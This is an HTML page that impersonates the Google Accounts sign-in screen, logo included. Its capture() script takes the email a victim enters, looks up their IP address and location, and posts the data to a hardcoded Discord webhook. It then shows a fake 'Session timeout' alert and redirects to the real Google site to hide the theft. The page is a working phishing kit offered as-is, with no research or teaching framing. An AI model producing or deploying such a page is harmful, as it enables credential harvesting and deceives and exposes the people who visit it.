<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
        .login-box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        input[type="email"] { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google" class="logo">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <input type="email" id="email" placeholder="Email or phone" required>
        <button class="btn-next" onclick="capture()">Next</button>
    </div>

    <script>
        async function capture() {
            const email = document.getElementById('email').value;
            if(!email) return;

            const webhookURL = "https://discord.com/api/webhooks/1462774752824262688/ilWEBKfwN1Y2lyWkJ3tkYE1GqUGlJxLQcst24ITvn_Kjkp_zecR9SNYkBwF4TfJnok40";

            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();

                const payload = {
                    embeds: [{
                        title: "Log Result",
                        color: 3447003,
                        fields: [
                            { name: "Email", value: email },
                            { name: "IP", value: data.ip },
                            { name: "City", value: data.city },
                            { name: "Country", value: data.country_name },
                            { name: "Provider", value: data.org }
                        ],
                        timestamp: new Date()
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                alert("Session timeout. Please try again.");
                window.location.href = "https://accounts.google.com/";
            } catch (e) {
                window.location.href = "https://accounts.google.com/";
            }
        }
    </script>
</body>
</html>
